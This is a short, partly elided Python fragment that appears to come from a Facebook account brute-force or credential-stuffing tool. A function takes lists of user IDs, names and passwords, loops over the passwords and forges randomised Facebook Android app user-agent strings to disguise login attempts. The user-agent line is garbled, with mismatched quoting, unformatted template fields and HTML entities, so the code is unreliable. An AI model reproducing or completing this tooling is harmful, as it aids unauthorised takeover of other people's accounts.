...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/{str(rr(410,450))}.0.0.{str(rr(1,9))}.{str(rr(50,110))};FBPN/com.facebook.katana;FBLC/id_ID;FBBV/{str(rr(410000000,499999999))};FBCR/Indosat Ooredoo;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2499;FBSV/11;FBCA/arm64-v8a:null;FBDM/&quot;+&quot;{density=2.75,width=2307,height=1036};FB_FW/1;FBRV/0;]"
                li = ['28','29','210']
